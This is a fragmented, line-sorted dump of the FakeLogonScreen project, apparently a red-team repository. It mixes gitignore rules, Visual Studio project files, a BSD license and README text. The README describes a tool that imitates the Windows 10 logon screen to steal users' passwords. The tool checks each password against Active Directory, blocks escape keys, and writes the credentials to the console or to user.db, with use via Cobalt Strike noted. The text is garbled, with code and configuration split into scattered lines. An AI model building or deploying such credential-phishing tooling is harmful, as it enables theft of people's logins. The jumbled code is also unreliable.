+"  <xsd:schema id=""root"" xmlns="""" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" xmlns:msdata=""urn:schemas-microsoft-com:xml-msdata"">"
+" ""Correct"" : ""Wrong"")"
+" @""C:"
+" Code to Disable WinKey, Alt"
+" Ignore Visual Studio temporary files, build results, and"
+" LOSS OF USE, DATA, OR PROFITS"
+" Note: Comment the next line if you want to checkin your web deploy settings,"
+" Since there are multiple workflows, uncomment next line to ignore bower_components"
+" checkin your Azure Web App publish settings, but sensitive information contained"
+" except build/, which is used as an MSBuild target."
+" otherwise, false.</param>"
+" to a newer Visual Studio version. Backup files are not needed,"
+"![FakeLogonScreen demo in Cobalt Strike](https://raw.githubusercontent.com/bitsadmin/fakelogonscreen/master/demo.gif ""FakeLogonScreen demo in Cobalt Strike"")"
+"- / (root): Built against .NET Framework 4.5 which is installed by default in Windows 8, 8.1 and 10"
+"- If custom background is configured by the user, shows that background instead of the default one"
+"// COM, set the ComVisible attribute to true on that type."
+"// [assembly: AssemblyVersion(""1.0."
+"1. Redistributions of source code must retain the above copyright notice, this"
+"2. Redistributions in binary form must reproduce the above copyright notice,"
+"<Project ToolsVersion=""15.0"" xmlns=""http://schemas.microsoft.com/developer/msbuild/2003"">"
+"<SettingsFile xmlns=""http://schemas.microsoft.com/VisualStudio/2004/01/settings"" CurrentProfile=""(Default)"">"
+"= delegate (object fSender, FormClosingEventArgs fe) { fe.Cancel = true"
+"AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE"
+"AnyCPU' "">"
+"AssemblyInfo.cs"" />"
+"CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,"
+"Copyright (c) 2020, Arris Huijgen"
+"DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR"
+"FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL"
+"It can either be executed by simply running the .exe file, or using for example Cobalt Strike's "
+"LockScreen"", SID)"
+"LockScreen_{1}"", customImagePath, imageOrder[0])"
+"Microsoft Visual Studio Solution File, Format Version 12.00"
+"Microsoft.CSharp.targets"" />"
+"Microsoft.Common.props"" Condition=""Exists('$(MSBuildExtensionsPath)"
+"Microsoft.Common.props')"" />"
+"OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE."
+"Project(""{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}"") = ""FakeLogonScreen"", ""FakeLogonScreen.csproj"", ""{D35A55BD-3189-498B-B72F-DC798172E505}"""
+"ReadOnly"", Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), SID)"
+"Redistribution and use in source and binary forms, with or without"
+"Resources.Designer.cs"">"
+"Resources.resx"">"
+"Screen"""
+"Settings.Designer.cs"">"
+"Settings.settings"">"
+"SubmitIcon.png"" />"
+"System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>"
+"THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ""AS IS"""
+"Tab, Ctrl"
+"UserIcon.png"" />"
+"[assembly: AssemblyCompany("""")]"
+"[assembly: AssemblyConfiguration("""")]"
+"[assembly: AssemblyCopyright(""Copyright "
+"[assembly: AssemblyCulture("""")]"
+"[assembly: AssemblyDescription("""")]"
+"[assembly: AssemblyFileVersion(""1.0.0.0"")]"
+"[assembly: AssemblyProduct(""FakeLogonScreen"")]"
+"[assembly: AssemblyTitle(""FakeLogonScreen"")]"
+"[assembly: AssemblyTrademark("""")]"
+"[assembly: AssemblyVersion(""1.0.0.0"")]"
+"[assembly: Guid(""d35a55bd-3189-498b-b72f-dc798172e505"")]"
+"img100.jpg"""
+"modification, are permitted provided that the following conditions are met:"
+"user.db"", Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData))"
+"xml version=""1.0"" encoding=""utf-8"""
+"{1}"", webScreenPath, image))"
+$(MSBuildToolsVersion)
+$(Platform)' == 'Debug
+$(Platform)' == 'Release
+$tf/
+%LOCALAPPDATA%
+' as shown below:
+- Blocks many shortkeys to prevent circumventing the screen
+- DOTNET35: Built against .NET Framework 3.5 which is installed by default in Windows 7
+- FakeLogonScreen.exe: Writes output to console which for example is compatible with Cobalt Strike
+- FakeLogonScreenToFile.exe: Writes output to console and 
+- Minimizes all existing windows to avoid other windows staying on top
+- Primary display shows a Windows 10 login screen while additional screens turn black
+- Username and passwords entered are outputted to console or stored in a file
+- Validates entered password before closing the screen
+- [Bb]ackup ([0-9]).rdl
+- [Bb]ackup ([0-9][0-9]).rdl
+- [Bb]ackup.rdl
+.DesktopClient/GeneratedArtifacts
+.DesktopClient/ModelManifest.xml
+.DotSettings.user
+.GhostDoc.xml
+.HTMLClient/GeneratedArtifacts
+.HxC
+.HxT
+.Server/GeneratedArtifacts
+.Server/ModelManifest.xml
+.VC.VC.opendb
+.VC.db
+.VisualState.xml
+.XML
+.[Cc]ache
+.[Cc]ache/
+.[Pp]ublish.xml
+.[Rr]e[Ss]harper
+.appx
+.appxbundle
+.appxupload
+.aps
+.axoCover/
+.azurePubxml
+.bim.layout
+.bim_
+.binlog
+.btm.cs
+.btp.cs
+.build.csdef
+.builds
+.cachefile
+.coverage
+.coveragexml
+.cr/personal
+.dbmdl
+.dbproj.schemaview
+.dotCover
+.e2e
+.fake/
+.gpState
+.hhc
+.hhk
+.hhp
+.htm
+.ilk
+.iobj
+.ionide/
+.ipdb
+.jfm
+.jmconfig
+.ldf
+.local.xml
+.localhistory/
+.log
+.mdf
+.meta
+.mfractor/
+.mm.
+.ncb
+.ndf
+.ntvs_analysis.dat
+.nuget.props
+.nuget.targets
+.nupkg
+.nvuser
+.obj
+.odx.cs
+.opendb
+.opensdf
+.opt
+.paket/paket.exe
+.pch
+.pdb
+.pfx
+.pgc
+.pgd
+.pidb
+.plg
+.psess
+.publishproj
+.publishsettings
+.pubxml
+.pyc
+.rdl.data
+.rptproj.bak
+.rptproj.rsuser
+.rsp
+.rsuser
+.sap
+.sass-cache/
+.sbr
+.scc
+.sdf
+.settings
+.sln.docstates
+.snk
+.snupkg
+.suo
+.svclog
+.tlb
+.tlh
+.tli
+.tmp
+.tmp_proj
+.tss
+.user
+.userosscache
+.userprefs
+.vbw
+.vs/
+.vsp
+.vspscc
+.vspx
+.vssscc
+.xml
+.xsd.cs
+//      Build Number
+//      Major Version
+//      Minor Version
+//      Revision
+//     Changes to this file may cause incorrect behavior and will be lost if
+//     Runtime Version:4.0.30319.42000
+//     This code was generated by a tool.
+//     the code is regenerated.
+// </auto-generated>
+// <auto-generated>
+// General Information about an assembly is controlled through the following
+// Setting ComVisible to false makes the types in this assembly not visible
+// The following GUID is for the ID of the typelib if this project is exposed to COM
+// Version information for an assembly consists of the following four values:
+// You can specify all the values or you can default the Build and Revision Numbers
+// associated with an assembly.
+// by using the '
+// set of attributes. Change these attribute values to modify the information
+// to COM components.  If you need to access a type in this assembly from
+//------------------------------------------------------------------------------
+/[Pp]ackages/
+/[Pp]ackages/build/
+/[Pp]ackages/repositories.config
+3. Neither the name of the copyright holder nor the names of its
+</OutputPath>
+</Project>
+</SettingsFile>
+</configuration>
+</root>
+<configuration>
+<root>
+= new System.EventHandler(this.Screen_Load)
+= new System.EventHandler(this.pbSubmit_Click)
+= new System.Windows.Forms.FormClosingEventHandler(this.Screen_FormClosing)
+= new System.Windows.Forms.KeyEventHandler(this.mtbPassword_KeyUp)
+ASALocalRun/
+All rights reserved.
+Any CPU
+Any CPU = Debug
+Any CPU = Release
+Any CPU.ActiveCfg = Debug
+Any CPU.ActiveCfg = Release
+Any CPU.Build.0 = Debug
+Any CPU.Build.0 = Release
+AnyoneRead
+AppPackages/
+Author: @bitsadmin
+Authored by Arris Huijgen ([@bitsadmin](https://twitter.com/bitsadmin/) - https://github.com/bitsadmin/)
+AutoTest.Net/
+BSD 3-Clause License
+Backup
+BenchmarkDotNet.Artifacts/
+Binaries available from the [Releases](https://github.com/bitsadmin/fakelogonscreen/releases) page.
+BundleArtifacts/
+ClientBin/
+CurrentVersion
+DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
+Debug
+DocProject/Help/
+DocProject/Help/Html2
+DocProject/Help/html
+DocProject/buildhelp/
+EndGlobal
+EndGlobalSection
+EndProject
+Esc Ends Here 
+Esc Starts Here 
+FakeLogonScreen is a utility to fake the Windows logon screen in order to obtain the user's password. The password entered is validated against the Active Directory or local machine to make sure it is correct and is then displayed to the console or saved to disk.
+FakesAssemblies/
+Folders:
+Generated
+Generated_Code/
+Global
+GlobalSection(ExtensibilityGlobals) = postSolution
+GlobalSection(ProjectConfigurationPlatforms) = postSolution
+GlobalSection(SolutionConfigurationPlatforms) = preSolution
+GlobalSection(SolutionProperties) = preSolution
+HideSolutionNode = FALSE
+IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
+License: BSD 3-Clause
+Microsoft
+MigrationBackup/
+MinimumVisualStudioVersion = 10.0.40219.1
+OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
+OpenCover/
+Package.StoreAssociation.xml
+PublishScripts/
+Release
+Resources
+SERVICES
+Screen
+ServiceFabricBackup/
+SolutionGuid = {D79BA83E-2278-4FC5-A982-8C9478339321}
+StyleCopReport.xml
+SubmitIcon.png
+SystemData
+SystemProtectedUserData
+TRACE</DefineConstants>
+TestResult.xml
+UpgradeLog
+UserIcon.png
+VisualStudioVersion = 16.0.29709.97
+Website: https://github.com/bitsadmin
+Windows
+[Aa][Rr][Mm]/
+[Aa][Rr][Mm]64/
+[Bb]in/
+[Bb]uild[Ll]og.
+[Dd]ebug/
+[Dd]ebugPS/
+[Dd]ebugPublic/
+[Ee]xpress/
+[Ll]og/
+[Ll]ogs/
+[Oo]bj/
+[Rr]elease/
+[Rr]eleasePS/
+[Rr]eleases/
+[Tt]est[Rr]esult
+[assembly: ComVisible(false)]
+_Chutzpah
+_NCrunch_
+_Pvt_Extensions
+_ReSharper
+_TeamCity
+_UpgradeReport_Files/
+__pycache__/
+_h.h
+_i.c
+_p.c
+_pkginfo.txt
+_wpftmp.csproj
+artifacts/
+bld/
+bower_components/
+crunch
+csx/
+dlldata.c
+ecf/
+endregion
+execute-assembly
+healthchecksdb
+ipch/
+issue-259490424)
+issuecomment-104372622)
+mono_crash.
+nCrunchTemp_
+namespace FakeLogonScreen
+namespace FakeLogonScreen.Properties {
+node_modules/
+nunit-
+orleans.codegen.cs
+paket-files/
+project.fragment.lock.json
+project.lock.json
+publish/
+rcf/
+region Windows Form Designer generated code
+user.db
+using Microsoft.Win32
+using System
+using System.Collections.Generic
+using System.Diagnostics
+using System.DirectoryServices.AccountManagement
+using System.Drawing
+using System.IO
+using System.Linq
+using System.Reflection
+using System.Runtime.CompilerServices
+using System.Runtime.InteropServices
+using System.Windows.Forms
+wwwroot/
+x64/
+x86/
+xml version='1.0' encoding='utf-8'
+{D35A55BD-3189-498B-B72F-DC798172E505}.Debug
+{D35A55BD-3189-498B-B72F-DC798172E505}.Release
